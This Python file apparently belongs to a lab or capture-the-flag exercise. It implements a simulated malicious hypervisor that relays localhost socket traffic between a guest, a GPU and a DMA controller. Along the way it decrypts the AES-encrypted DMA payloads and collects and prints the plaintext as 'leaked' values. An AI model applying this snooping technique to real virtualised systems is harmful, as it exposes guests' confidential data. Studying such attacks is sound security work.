import socket
import threading
import helper
import sys
from donotmodify import *

clients = []
leakedval = []

def handle_client(connection, client_address, dma_socket):
    try:
         # print("Connected to", client_address)
        clients.append(connection)
        while True:
            data = connection.recv(1024)
            if data:
                # If the incoming request is a DMA command, the hypervisor
                # sends it to the dma controller
                if b'DMA:IN' in data or b'DMA:OUT' in data:
                    if b'DMA:IN' in data:
                        cmdsplit = data[helper.SIGLEN:].split(b":")
                        if len(cmdsplit) >= 4 and cmdsplit[0] == b'DMA' and cmdsplit[1] == b'IN':
                            encdata = b":".join(cmdsplit[3:])
                            try:
                                parts = encdata.split(b":", 1)
                                if len(parts) == 2:
                                    length = parts[0].decode()
                                    cipher = parts[1]
                                    decinput = helper.dec_aes(length, cipher).decode()
                                    leakedval.append(float(decinput))
                            except:
                                pass
                    dma_socket.sendall(data)
                    msg = dma_socket.recv(1024)
                    if b'DMA-OUT-DONE' in msg:
                        dsplit = msg.split(b":")
                        if len(dsplit) >= 3:
                            ciphf = b":".join(dsplit[2:])
                            try:
                                decrypted = helper.dec_aes(dsplit[1].decode(), ciphf).decode()
                                valsplit = decrypted.split(':')
                                if valsplit[0] == 'RES':
                                    leakedval.append(float(valsplit[1]))
                                    print(leakedval, flush=True) 
                                    sys.stdout.flush() 
                                    leakedval.clear()
                            except Exception as e:
                                pass
                    connection.sendall(b'\x00'*helper.SIGLEN+msg)
                else:
                    relay_message(connection, data)
            else:
                break
    finally:
        # print("Connection closed with", client_address)
        connection.close()

def relay_message(sender, message): # Relays the message to the guest or to the gpu
    for client in clients:
        if client != sender:  
            try:
                client.sendall(message)
            except Exception:
                client.close()
                clients.remove(client)

def start_hypervisor():
    dma_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    dma_address = ('localhost', DMASOCKET)
    helper.connect(dma_socket,dma_address)
    
    hypervisor_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    hypervisor_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    hypervisor_address = ('localhost', SOCKET)
    hypervisor_socket.bind(hypervisor_address)
    hypervisor_socket.listen(2)
    # print("Hypervisor is listening on", hypervisor_address)

    
    while True:
        connection, client_address = hypervisor_socket.accept()
        client_thread = threading.Thread(target=handle_client, args=(connection, client_address, dma_socket))
        client_thread.start()

if __name__ == "__main__":
    start_hypervisor()
